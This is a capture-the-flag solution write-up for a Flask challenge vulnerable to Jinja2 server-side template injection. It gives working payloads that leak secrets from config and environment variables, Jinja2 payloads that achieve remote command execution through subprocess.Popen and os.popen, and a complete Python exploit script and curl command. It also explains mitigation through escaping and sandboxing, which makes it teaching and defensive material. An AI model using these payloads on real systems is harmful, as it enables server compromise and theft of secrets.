# Challenge 22: SSTIGreet — Solution

## Vulnerability Type
**Server-Side Template Injection (SSTI) — Jinja2**

## Description
The `/render` endpoint passes user-supplied text directly to Flask's `render_template_string()`. This function compiles and executes the input as a Jinja2 template, giving an attacker full access to the template context and Python's object hierarchy — including environment variables where the flag lives.

## Vulnerable Code

```python
# app.py — /render route
user_template = request.form.get("template", "")
output = render_template_string(user_template)   # ← user input executed as template
```

The flag is stored in Flask's app config:
```python
app.config["FLAG"] = FLAG   # accessible via {{config['FLAG']}} in templates
```

## Exploitation Steps

### Step 1 — Confirm SSTI with math probe

Submit in the textarea:
```
{{7*7}}
```
If output is `49` → SSTI confirmed.

### Step 2 — Leak the flag (simple path)

The flag is in `app.config`:
```
{{config['FLAG']}}
```

Or via environment variables (alternative):
```
{{request.application.__globals__.__builtins__.__import__('os').environ.get('FLAG')}}
```

### Step 3 — Full RCE (bonus — not needed for flag)

```
{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```
> Index 439 is `subprocess.Popen` — may vary by Python version. Enumerate with `.__subclasses__()` first.

Using `lipsum` (simpler):
```
{{lipsum.__globals__.os.popen('id').read()}}
```

## Complete Exploit Script

```python
import requests
import re

TARGET = "http://<host>:5000"

# Quick probe
r = requests.post(f"{TARGET}/render", data={"template": "{{7*7}}"})
assert "49" in r.text, "SSTI not triggered"
print("[+] SSTI confirmed (7*7=49)")

# Leak flag from config
r = requests.post(f"{TARGET}/render", data={"template": "{{config['FLAG']}}"})
flag = re.search(r"FCTF\{[^}]+\}", r.text)
if flag:
    print(f"[+] Flag: {flag.group()}")
else:
    # Fallback: read from os.environ
    payload = "{{request.application.__globals__.__builtins__.__import__('os').environ.get('FLAG')}}"
    r = requests.post(f"{TARGET}/render", data={"template": payload})
    flag = re.search(r"FCTF\{[^}]+\}", r.text)
    print(f"[+] Flag (env): {flag.group() if flag else 'not found'}")
```

### Manual with curl

```bash
curl -X POST http://<host>:5000/render \
  --data-urlencode "template={{config['FLAG']}}"
```

## Mitigation

### Fix: Never render user input as templates

```python
# BEFORE (vulnerable)
output = render_template_string(user_template)

# AFTER — escape and display as plain text
from markupsafe import escape
output = f"<pre>{escape(user_template)}</pre>"
```

If template rendering is genuinely needed, use a **sandboxed environment**:

```python
from jinja2.sandbox import SandboxedEnvironment

safe_env = SandboxedEnvironment()

def safe_render(user_template: str) -> str:
    try:
        return safe_env.from_string(user_template).render()
    except Exception as e:
        return f"Error: {e}"
```

Even with sandboxing, avoid passing sensitive data (like `FLAG`) into the template context.

## How the Attack Works

```
render_template_string("Hello {{7*7}}")
         ↓
    Jinja2 evaluates {{ ... }} blocks
         ↓
    "Hello 49"

render_template_string("{{config['FLAG']}}")
         ↓
    config is Flask's current app config dict
         ↓
    "FCTF{...}"    ← flag leaked!
```

## SSTI vs XSS

| | XSS | SSTI |
|---|---|---|
| Executed by | Browser (client) | Server (Python/Jinja2) |
| Impact | Steals cookies/sessions | RCE, data exfiltration |
| Trigger | `<script>` tags | `{{ }}` / `{% %}` |

## Learning Points
- SSTI gives **server-side** code execution — far more dangerous than XSS
- Flask's `render_template_string` is meant for trusted templates, not user input
- Store secrets outside the template context (don't put `FLAG` in `app.config` if rendering user templates)
- Use `SandboxedEnvironment` if template-like user input is a genuine requirement

## References
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings — Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
